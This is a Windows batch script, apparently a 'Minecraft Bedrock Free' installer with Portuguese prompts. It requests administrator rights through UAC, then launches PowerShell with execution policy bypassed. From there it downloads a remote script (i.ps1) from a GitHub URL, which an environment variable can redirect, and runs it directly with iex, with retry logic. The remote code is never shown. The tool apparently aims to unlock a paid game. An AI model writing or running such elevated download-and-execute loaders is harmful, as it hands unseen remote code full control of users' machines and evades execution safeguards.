@echo off
chcp 65001 >nul
setlocal EnableExtensions
title Minecraft Bedrock Free

net session >nul 2>&1
if %errorlevel% neq 0 goto needadmin

powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "$ErrorActionPreference='Stop'; [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; $u='https://raw.githubusercontent.com/CoelhoFZ/Minecraft-Bedrock-Free/main'; if($env:MBU_BASE_URL){ $u=$env:MBU_BASE_URL.TrimEnd('/') }; $ok=$false; $e=$null; $c=$null; for($i=1;$i -le 3;$i++){ try{ $r=Invoke-WebRequest -UseBasicParsing -Uri ($u+'/i.ps1') -TimeoutSec 30; $c=$r.Content; if($c -is [byte[]]){ $c=[Text.Encoding]::UTF8.GetString($c) }; $c=[string]$c; if($c.Length -gt 0 -and [int]$c[0] -eq 0xFEFF){ $c=$c.Substring(1) }; $ok=$true; break } catch { $e=$_.Exception.Message; $sc=$null; try{ $sc=[int]$_.Exception.Response.StatusCode }catch{}; $t=($sc -in @(408,429,502,503,504)) -or ($e -match '50[234]|429|408|timed out|Unable to connect|The connection was closed|The remote name could not be resolved'); if(-not $t -or $i -ge 3){ break }; Write-Host ('Erro temporario de rede (tentativa ' + $i + ' de 3): tentando de novo...') -ForegroundColor Yellow; Start-Sleep -Seconds (3*$i) } }; if(-not $ok){ Write-Host ''; if($e){ Write-Host $e -ForegroundColor DarkGray }; Write-Host 'ERRO: nao foi possivel baixar o instalador deste endereco:' -ForegroundColor Red; Write-Host ('  ' + $u) -ForegroundColor DarkGray; Write-Host 'Verifique sua conexao com a internet e rode este arquivo de novo.' -ForegroundColor Red; Write-Host 'Se o erro continuar, baixe o install.bat da versao mais recente neste link:' -ForegroundColor Yellow; Write-Host '  https://github.com/CoelhoFZ/Minecraft-Bedrock-Free/releases/latest/download/install.bat' -ForegroundColor Cyan; Write-Host 'ERROR: could not download the installer from the address above. Check your internet connection and run this file again. If it keeps failing, download the newest install.bat from the link above.' -ForegroundColor Yellow; Read-Host 'Pressione ENTER para fechar'; exit 1 }; iex $c"
exit /b %errorlevel%

:needadmin
echo Solicitando permissao de administrador (UAC)...
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Start-Process -FilePath '%~f0' -Verb RunAs"
exit /b
